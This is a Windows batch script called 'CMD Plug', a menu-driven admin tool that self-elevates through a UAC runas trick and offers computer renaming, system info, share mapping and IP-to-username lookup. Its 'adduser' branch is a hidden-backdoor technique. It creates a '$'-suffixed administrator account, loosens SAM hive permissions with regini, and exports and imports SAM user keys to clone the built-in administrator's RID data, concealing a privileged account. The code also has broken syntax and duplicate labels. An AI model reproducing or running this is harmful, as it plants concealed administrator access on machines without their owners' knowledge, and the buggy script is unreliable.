
@echo off  
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" 
 
if '%errorlevel%' NEQ '0' (  
    goto UACPrompt  
) else ( goto gotAdmin )  
   
:UACPrompt  
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs" 
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs" 
    "%temp%\getadmin.vbs" 
    exit /B  
   
:gotAdmin  
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )  
    pushd "%CD%" 
    CD /D "%~dp0" 
 
:begin


@Echo Off
color 2e
Title  CMD Plug

:begin
cls
Echo Select the following features to use:
echo     [1]  Computer rename
echo     [2]  Get system information
echo     [3]  Create a new user
echo     [4]  Delete old users
echo     [5]  Get their username by IP
echo     [6]  Mapping
echo     [7]  Registry/Regedit
echo     [Q]  Quit
Set /P Choice= [Input the command]  
If not "%Choice%"=="" (
  If "%Choice%"=="1" goto rename
  If "%Choice%"=="2" goto systeminfo
  if "%Choice%"=="3" goto adduser
  if "%Choice%"=="4" goto deluser
  if "%Choice%"=="5" goto ipuser
  if "%Choice%"=="6" goto mapping
  if "%Choice%"=="7" goto regedit
  If "%Choice%"=="Q" goto quit
  If "%Choice%"=="q" goto quit
)
else(
  goto begin
)
:rename
set Name=%COMPUTERNAME%
:GetHostName
set /p Name=Please enter a new machine name:
if %Name%==%COMPUTERNAME% goto GetHostName
reg add "HKLM\system\CurrentControlSet\services\tcpip\parameters" /v "NV Hostname" /d %Name% /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName" /v ComputerName /d %Name% /f
echo The machine name has been modified and will take effect after restart!
set /p Res=Whether to restart the machine[y/n]:
if /i %Res% ==y (
	shutdown -r -t 0
)
else(
	echo Please restart later, the modified machine name will take effect.
)
pause>nul
goto begin


:systeminfo
md systeminfo
systeminfo  >> systeminfo\%computername%.txt
echo Output system information to systeminfo folder
pause>nul
goto begin


:adduser
net user
set /p Choose=Whether to delete hidden accounts[y/n]:
if /i "%Choose%"=="y" (
	goto hide
)
else(
	goto show
)
:hide
set /p User=Please enter user username:
set /p Password=Please enter your user password:
net user %User%$ %Password% /add
net localgroup administrators %User%$ /add
echo Hidden user created successfully!
set route=HKEY_LOCAL_MACHINE\SAM\SAM
:fix
del %tmp%\ko.txt /q
echo "%route%"[1 17]  >>%tmp%\ko.txt
regini %tmp%\ko.txt
set route=HKEY_LOCAL_MACHINE\SAM\SAM\Domains
:fix
del %tmp%\ko.txt /q
echo "%route%"[1 17]  >>%tmp%\ko.txt
regini %tmp%\ko.txt
md reg
reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\%User%$" reg\BA_%User%$.reg
reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000003EA" reg\BB_.reg
reg export "HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4" reg\AA_1F4.reg
start "" regedit
set /p Res=BB_Whether the modification is completed[y/n]:
if /i %Res% ==y	(
	net user %User%$ /del
	reg import reg\BA_%User%$.reg
	reg import reg\BB_.reg
	net user %User%$
  rmdir /s/q 222 reg
)
else(
  rmdir /s/q 222 reg
)
pause>nul
goto begin
:show
set /p User=Please enter user username:
set /p Password=Please enter your user password:
net user %User% %Password% /add
net localgroup administrators %User% /add
echo New user created successfully!
pause>nul
goto begin


:deluser
net user
set /p Choose=Whether to delete hidden accounts[y/n]:
if /i "%Choose%"=="y" (
	goto hide
)
else(
	goto show
)
:hide
set /p User=Please enter user name:
net user %User%$ %Password% /del
echo Hidden user deleted successfully!
pause>nul
goto begin
:show
set /p User=Please enter user name:
net user %User% /del
echo Old user deleted successfully!
pause>nul
goto begin


:ipuser
set /p Ip=Please enter the IP:
nbtstat -A %Ip%
pause>nul
goto begin


:mapping
set /p Ip=Please enter IP to view the shared network:
net view \\%Ip%
set /p Mlocal=Please enter the local drive letter:
net use %Mlocal% \\%Ip%
pause>nul
goto begin


:regedit
start "" regedit
pause>nul
goto begin


:quit
exit
pause>nul
goto begin



